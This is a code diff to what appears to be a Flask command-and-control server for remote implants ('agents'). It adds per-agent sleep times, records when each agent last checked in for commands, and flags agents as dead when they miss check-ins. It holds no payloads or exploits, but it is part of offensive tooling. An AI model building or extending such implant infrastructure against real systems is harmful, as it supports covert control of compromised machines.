@@ -1,3 +1,4 @@
+from datetime import datetime, timedelta
 from flask import render_template, redirect, url_for, request, session, flash
 from flask import abort, send_from_directory
 from flask_wtf import FlaskForm
@@ -6,6 +7,8 @@ from models import app, Agent, db, Commands
 from wtforms import StringField
 
 import os
+import time
+import threading
 import subprocess
 
 
@@ -61,8 +64,7 @@ def add_agent(agent_dict):
 
     :param agent_dict: A dictionary containing all the agent information
     :type agent_dict: dict
-    :returns: the ID of the new agent
-    :rtype: int
+    :returns: the ID of the new agent :rtype: int
     """
     # if not db.session.query(db.exists().where(Agent.ip == agent_dict['IP'])
     # ).scalar():
@@ -70,6 +72,7 @@ def add_agent(agent_dict):
     args += [str(agent_dict['total'])]
     args += [agent_dict['IP']]
     args += [agent_dict['USERNAME']]
+    args += [agent_dict['SleepTime']]
     agent = Agent(*args)
     db.session.add(agent)
     db.session.flush()
@@ -119,6 +122,7 @@ def home():
     active implants calling back to the server
 
     """
+    check_agent_alive()
     agents = db.session.query(Agent).all()
     return render_template('index.html', agents=agents)
 
@@ -188,12 +192,17 @@ def get_command():
         json = request.json
         if json is None:
             return "Bad request"
-        agent_id = json['id']
+        agent_id = int(json['id'])
+        agent = Agent.query.filter(Agent.id == agent_id).first()
+        curr_time = datetime.now()
+        agent.lastSeen = curr_time.strftime("%d %B, %Y %H:%M:%S")
         res = Commands.query.filter(
                                     Commands.implantID == agent_id,
                                     Commands.retrieved == False
                                     ).first()
         if res is None:
+            db.session.commit()
+            db.session.flush()
             return "None"
         res.retrieved = True
         db.session.flush()
@@ -296,6 +305,22 @@ def logout():
     session.pop('logged_in', None)
     flash('You were just logged out!')
     return redirect(url_for('welcome'))
+
+
+def check_agent_alive():
+    agents = db.session.query(Agent).all()
+    for agent in agents:
+        last_seen = agent.lastSeen
+        last_seen = datetime.strptime(last_seen, '%d %B, %Y %H:%M:%S')
+        curr_time = datetime.now()
+        elapsed = curr_time - last_seen
+        agent_expected = timedelta(seconds=(agent.sleepTime*2))
+        if elapsed > agent_expected:
+            agent.isAlive = False
+        else:
+            agent.isAlive = True
+        db.session.flush()
+        db.session.commit()
 
 
 if __name__ == '__main__':
